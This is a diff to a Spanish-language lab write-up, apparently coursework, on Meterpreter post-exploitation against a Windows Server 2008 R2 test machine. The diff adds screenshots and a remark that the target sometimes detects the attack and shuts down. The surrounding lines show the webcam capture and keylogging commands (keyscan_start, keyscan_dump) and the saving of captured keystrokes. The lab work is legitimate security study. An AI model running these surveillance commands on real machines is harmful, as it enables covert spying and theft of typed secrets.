@@ -72,6 +72,9 @@ meterpreter > webcam_snap      # Tomar fotografía instantánea
 meterpreter > webcam_stream    # Iniciar stream de video en vivo
 ```
 
+<img width="732" height="75" alt="image" src="https://github.com/user-attachments/assets/3ed5a5a0-8ccc-425a-a629-12dff7114591" />
+
+
 **Resultado:** El comando `webcam_list` no devolvió dispositivos disponibles. Esto se debe a dos razones técnicas del entorno:
 
 1. **Sistema operativo servidor:** Windows Server 2008 R2 no incluye los drivers ni frameworks multimedia necesarios para webcam (a diferencia de Windows 10/11 de escritorio).
@@ -96,6 +99,12 @@ Para volver a Meterpreter desde la shell:
 ```bash
 C:\Windows\system32> exit
 ```
+
+<img width="697" height="435" alt="image" src="https://github.com/user-attachments/assets/823ac635-ab55-4f7e-a3c4-22582f143324" />
+
+Cabe aclarar que aveces la maquina de windows detecta que esta siendo atacada, por lo que se apagara sola:
+
+<img width="1705" height="767" alt="image" src="https://github.com/user-attachments/assets/271c1395-d542-4f22-867a-4b2b465e2542" />
 
 ---
 
@@ -172,6 +181,7 @@ meterpreter > keyscan_start    # Iniciar captura de pulsaciones
 meterpreter > keyscan_dump     # Mostrar pulsaciones capturadas
 meterpreter > keyscan_stop     # Detener captura
 ```
+<img width="1230" height="645" alt="image" src="https://github.com/user-attachments/assets/58340079-a71a-4fc0-b275-f16e69631807" />
 
 **Guardar la salida en un archivo `.txt` usando `spool`:**
 ```bash
@@ -196,6 +206,8 @@ cat /home/kali/keylog_evidencia.txt
 ```
 
 **Resultado:** Se capturaron correctamente las pulsaciones de teclado realizadas en la máquina Windows víctima y se almacenaron en `/home/kali/keylog_evidencia.txt` en Kali.
+
+<img width="1488" height="668" alt="image" src="https://github.com/user-attachments/assets/8b491cbe-ed26-427c-9459-1b0024c4b53e" />
 
 > **Nota técnica:** El comando `spool` pertenece a `msfconsole`, no a la sesión de Meterpreter. Debe activarse **antes** de interactuar con la sesión para que registre toda la salida incluyendo el `keyscan_dump`.
 
